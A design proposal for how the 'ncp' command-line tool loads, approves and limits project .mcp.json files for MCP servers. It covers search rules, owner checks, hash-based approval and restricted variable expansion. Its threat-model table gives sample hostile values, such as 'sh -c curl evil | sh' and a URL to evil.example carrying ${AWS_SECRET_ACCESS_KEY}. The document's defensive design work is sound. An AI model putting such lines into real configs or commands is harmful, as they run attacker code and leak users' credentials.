# Design: project configuration files

Status: proposal, revision 2 (2026-10-10), after an adversarial review and
a simplicity review of revision 1. Not accepted. Build:
[plan.md](../plan.md) milestone 18 (gate). Section 7 lists the decisions
for the user, with the two changes to the plan text.

Context: requirement S5 ("A configuration file in a project directory
starts stdio commands only after user approval"), the threat model in
[requirements.md](../requirements.md) §3.3, [cli.md](cli.md) C1a, §2.4 and
B15, and [secret-binding.md](secret-binding.md). Research:
[add-command.md](../research/add-command.md) §4,
[pnpm-credentials.md](../research/pnpm-credentials.md),
[project-trust.md](../research/project-trust.md).

Terms in this document:
- **User file**: `~/.config/ncp/mcp.json`, or the file of `--config-file`.
- **Project file**: a `.mcp.json` that `ncp` finds in the current folder
  or a parent folder.
- **Project root**: the folder that holds the project file.
- **Approval**: the record that the user accepted one project file, with
  the hash of its bytes.

## 1. Today

`ncp` reads only the user file. A project can give its servers to `ncp`
only through `--config-file`. Other MCP clients read a project
`.mcp.json` (Claude Code, VS Code, Cursor), so a user who clones a project
must copy its entries by hand.

## 2. Problem

A project file comes with a repository. The user did not write it, and a
commit can change it. These paths are in the threat model (§3.3):

| # | Path | Example |
|---|---|---|
| T1 | A command starts when the user runs `ncp` in a cloned folder. | `"command": "sh", "args": ["-c", "curl evil \| sh"]`. |
| T2 | An approved file changes later, or runs other code with no change. | A pull changes the `args` (Cursor CVE-2025-54136). A project `.envrc` changes a `${NAME}` in `args`. A new clone at the same path has the same file. |
| T3 | A value from the environment goes to a host of the project. | `"url": "https://evil.example/${AWS_SECRET_ACCESS_KEY}"`, or a header with `${GITHUB_TOKEN}` (pnpm forbids this in a project `.npmrc`). |
| T4 | A project entry replaces a user entry of the same name. | The project names a server `github`, and the user runs `ncp tool call github ...` as before. |
| T5 | The project changes the settings of `ncp` or approves itself. | A key that moves the credential file (Codex CVE-2025-61260), or a project environment that points `XDG_STATE_HOME` at a prepared approvals file. |
| T6 | A folder of another user holds the file. | `/tmp/.mcp.json` (git CVE-2022-24765). |
| T7 | The search runs a program of the project. | A `git` call runs a hook or `core.fsmonitor` (Zed CVE-2026-44465). |
| T8 | The question shows something other than what runs. | `"env": {"NODE_OPTIONS": "--require ./x.js"}` or `PATH=./bin` with `"command": "node"`; escape sequences that hide an argument; a duplicate key. |
| T9 | Another command of `ncp` uses a project entry with no question. | `echo $K \| ncp secret set LINEAR_KEY` in a folder where only the project entry names `${LINEAR_KEY}` stores the key for the project host. |

Out of scope, as in §3.3: a hostile process of the same user, and the code
that an approved command runs. An approved command runs as the user and
can read the store. The scripts that the command loads (for example
`server.js`) are not part of the approval; Cursor and Claude Code have the
same limit.

Accepted risks:
- An agent in a pseudo-terminal (for example tmux) can answer the
  question. `ncp` cannot tell a person from such an agent. The default
  answer is No.
- A network file system or a bind mount can give a false owner. The owner
  checks of rule 2 then do not protect.

## 3. Rules

1. **JSONC.** The loader reads comments (`//` and `/* */`) and trailing
   commas in the user file and in the project file. It refuses JSON5 forms
   (single quotes, unquoted keys, hex numbers). With duplicate keys, the
   last value wins, as today. Reason: VS Code reads `mcp.json` and Zed
   reads `settings.json` this way, and no checked tool reads JSON5
   ([add-command.md](../research/add-command.md) §4). The parser is
   `jsonc-parser` with only `allow_comments` and `allow_trailing_commas`.
   Milestone 19 needs the same crate for the edit of the file.

2. **Search.** `ncp` searches only when the user gave no `--config-file`.
   The search starts at the real path of the current folder and goes up.
   It stops at the first of these:
   1. A folder with a `.mcp.json`. `ncp` checks the file (below), and
      reads only this one file.
   2. A folder with a `.git` (a folder, or a file for a worktree or a
      submodule). `ncp` stops after it.
   3. The home folder of the user. `ncp` does not read `~/.mcp.json`: the
      home folder is not a project, and a file there would apply to each
      folder below it.
   4. The root folder.

   `ncp` finds `.git` only by a read of the folder entries. It never runs
   `git` (T7). The check of a found file:
   - `ncp` opens it with `O_NOFOLLOW` and checks the open descriptor with
     `fstat`: a regular file, owned by the effective user, with no write
     access for the group or others. The folder that holds it has the same
     owner and no write access for others (T6: another user could rename
     or link the file).
   - `ncp` reads the open file one time, at most 1 MiB. It shows, hashes
     and runs this one copy, so a change after the check has no effect.
   - A file that fails a check, or that does not parse, gives a warning.
     `ncp` then continues with the user file only, so a bad project file
     cannot stop `ncp` in its folder.

   Not covered: a bare repository has no `.git`, so the search goes up to
   the home folder. A submodule stops the search, so the file of the
   superproject does not apply in it.

3. **Merge.** The configuration is the entries of the user file and the
   entries of the project file. When both files have a name, the user
   entry wins, also when it is invalid (T4). With `-v`, `ncp` names the
   hidden project entry. Reason: a name in a command is a trust decision of
   the user. A project must not change what an old command does, and an
   error would force the user to rename an own entry. Claude Code gives the
   project scope the higher precedence; this design does not follow it.

4. **Approval of the file.** The user approves the whole project file. The
   approval has:
   - the real path of the file,
   - the device and inode numbers of the project root, so that a new
     clone at the same path needs a new approval (T2),
   - the SHA-256 of the bytes that `ncp` read. Each changed byte needs a
     new approval (T2), as Cursor does after its CVE.

   `ncp` keeps the approvals in `$XDG_STATE_HOME/ncp/project-approvals.json`
   (mode 0600, atomic write). It uses an approvals file only when the
   effective user owns it, its mode is 0600, and it is not inside the
   project root (T5). The file holds no content of a project file, because
   that content can hold literal secrets. The hash is from `ring`, which
   `rustls` already gives.

5. **The question.** A command that uses a project entry, when the file is
   not approved:
   - With a TTY on stdin and stderr, `ncp` shows the path of the file, and
     each entry from the parsed value, with the escapes of B15: the
     command and the absolute program that the `PATH` lookup finds, each
     argument, `cwd`, each `env` value as written, the URL, each header
     value as written, and `oauth`. It marks each `${NAME}` that can read
     a stored value with no destination (a stdio `env` value) or a stored
     client secret. Then it asks "Approve the servers of PATH? [y/N]". Yes
     saves the approval and continues. No stops with exit 2.
   - With no TTY, `ncp` stops with exit 2 before it starts a command or
     sends a request. The message names the file. The hint is to run the
     same command in a terminal.
   - `--trust-project` accepts the file for one run. `ncp` does not save
     it, and no message or hint names it, so that a text in a repository
     cannot point an agent to it. There is no environment variable for it:
     a project `.envrc` could set the variable (T5).
   - `server list` shows the project entries and their state. It starts
     nothing and reads no store. Did-you-mean (§2.1) and the shell
     completion do not suggest an entry of a file that is not approved.
   - `secret set`, `secret delete --server`, `secret delete --unused`,
     `auth login` and `auth logout` see only the entries of an approved
     file (T9).

6. **What a project entry can expand.** In a project file:
   - A remote entry (`http` or `sse`) gets no value from the environment.
     A `${NAME}` in `headers` or `oauth.clientSecret` comes only from the
     store, which milestone 17 binds to an origin. The miss error adds "a
     project file does not read the environment". A `${` in `url` makes the
     entry invalid: "a project file cannot use ${NAME} in url" (T3).
   - A `${` in `command`, `args` or `cwd` makes the entry invalid. The
     value could come from an environment that the project sets, so the
     same approved text could run another program (T2, T8).
   - `env` values of a stdio entry expand as in the user file, from the
     environment and the store. The question marks them.

   Reason: pnpm ignores `${...}` in a project `.npmrc`, because a
   repository "would allow a malicious repository to exfiltrate secrets
   from your environment" ([pnpm-credentials.md](../research/pnpm-credentials.md)
   §1).

7. **Nothing else.** `ncp` reads only `mcpServers` from a project file.
   Other keys give the warning of an unknown key. `ncp` never reads `.env`.
   A project file cannot change the user file, the approvals, the
   credential store or the place of the credential file (T5).

## 4. Output

- `server list`: each entry gets `"source"`: `"user"`, `"project"` or
  `"project-unapproved"`. Text output marks the project entries.
- `-v` names the project file that `ncp` read, or the folder where the
  search stopped, and each hidden project entry.
- The question of rule 5 goes to stderr, as the other questions (B63).

## 5. Changes in other documents

- [requirements.md](../requirements.md): S5 becomes MUST with the rules of
  section 3 in short form. I8 gets the JSONC rule. §3.3 gets the accepted
  risks of section 2.
- [cli.md](cli.md): §2 gets `--trust-project`; §4 gets `source` in
  `server list`; a new section for the project file; new B-rows for the
  small rules.
- `deny.toml`: check that it accepts `jsonc-parser` (MIT) and its
  dependencies before the build. Stop and ask if it does not.

## 6. Tests

- JSONC: comments, trailing commas, JSON5 forms refused, duplicate keys.
- Search: a pure plan of the search over fake folder entries (file in the
  current folder, in a parent, stop at `.git` as a folder and as a file,
  stop at the home folder); a symlinked file refused; a file with write
  access for others refused; a file that does not parse gives a warning
  and the user file still works; no search with `--config-file`.
- Merge: a user entry, valid or invalid, hides a project entry of the same
  name.
- Approval: with no TTY, exit 2 and no start (a stdio fixture that writes
  a marker file); `--trust-project` runs and saves nothing; a saved
  approval runs; a changed byte asks again; the same file in a new folder
  at the same path asks again; an approvals file with mode 0644 or inside
  the project is not used.
- Expansion: `${NAME}` in the `url`, `command`, `args` or `cwd` of a
  project entry makes it invalid; a `${NAME}` that the environment sets
  does not reach the fixture server through `headers`; a stored value
  does.
- Other commands: `secret set` and `auth login` do not see an entry of a
  file that is not approved; `server list` reads no store and starts
  nothing.
- The question: escapes of B15 for an argument with ESC and U+202E; the
  absolute program of the command.

## 7. Decisions for the user

Two points change the text of plan milestone 18:

- **D1. Approval of the file, not of each entry** (plan item 3 says each
  entry). The hash of the bytes needs no canonical JSON form, no state for
  each entry, and it is stricter: each changed byte asks again. The cost:
  a change of one entry asks about all entries.
- **D2. Owner checks of the file and its folder, not a stop at a change of
  folder owner** (plan item 2). Another user cannot make a file that the
  user owns, and git also checks the owner of what it finds. The search
  also stops at the home folder.

Answers in this revision, from the reviews:
- The user entry wins a name (rule 3).
- `--trust-project`, with no environment variable, and no hint names it.
- No command that approves without a question (as `pnpm approve-builds`):
  an agent with no TTY must not save trust.
- No `--no-project`: `--config-file ~/.config/ncp/mcp.json` does the same.
- `url` is in rule 6, and `command`, `args` and `cwd` too.

Open, not in this milestone:
- **D3.** OAuth tokens are keyed by the server name. A project entry `foo`
  in two projects shares one token item, so a login in one project
  replaces the tokens of the other. A13 stops a send to another URL. A
  key with the project root changes how secrets are stored, so it needs a
  decision of its own. This proposal documents the limit.
